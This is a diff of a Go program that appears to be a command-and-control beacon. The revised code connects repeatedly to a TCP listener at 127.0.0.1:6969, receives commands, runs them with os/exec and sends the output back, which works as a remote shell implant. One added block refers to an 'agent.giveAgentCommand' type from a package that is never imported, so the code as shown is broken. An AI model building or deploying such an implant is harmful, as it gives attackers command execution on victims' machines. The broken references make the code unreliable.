@@ -1,29 +1,35 @@
 package main
 
 import (
-	"bufio"
+	"encoding/gob"
 	"fmt"
 	"log"
 	"net"
 	"os/exec"
-	"regexp"
 	"strings"
+	"time"
 )
 
 func main() {
-	beacon, err := net.Dial("tcp", "127.0.0.1:6969")
-	if err != nil {
-		log.Fatalln(err)
-	}
-
 	for {
+		beacon, err := net.Dial("tcp", "127.0.0.1:6969")
+		if err != nil {
+			log.Fatalln(err) // maybe try diff IP
+		}
+		err = beacon.SetReadDeadline(time.Now().Add(time.Second * 5))
+		if err != nil {
+			log.Fatalln(err)
+		}
 		CmdOut := ""
-		text, _ := bufio.NewReader(beacon).ReadString('\n')
-		message := strings.Split(text, "\n")
-		// if message[0] == "" {
-		// 	time.Sleep(3 * time.Second)
-		// 	continue
-		// }
+		text := make([]byte, 4096)
+		_, err = beacon.Read(text)
+		if err != nil {
+			log.Println("No conn beacon in 5 sec")
+			time.Sleep(time.Second * 5)
+			continue
+		}
+		out := string(text)
+		message := strings.Split(out, "\n")
 		if message[0] != "" {
 			fmt.Print("->: " + message[0])
 			tokens := strings.Split(message[0], " ")
@@ -38,12 +44,13 @@ func main() {
 				CmdOut = err.Error()
 			}
 			CmdOut += string(buf)
-			// fmt.Print(CmdOut)
-			re := regexp.MustCompile(`\r?\n`)
-			CmdOut = re.ReplaceAllString(CmdOut, "~w")
-			fmt.Fprintf(beacon, CmdOut+"\n")
+			beacon.Write(buf)
 			continue
 		}
+		dec := gob.NewDecoder(beacon)
+		instruct := &agent.giveAgentCommand{}
+		dec.Decode(instruct)
+		fmt.Printf("Received : %+v", instruct)
 
 		if strings.TrimSpace(string(CmdOut)) == "STOP" {
 			fmt.Println("TCP client exiting...")
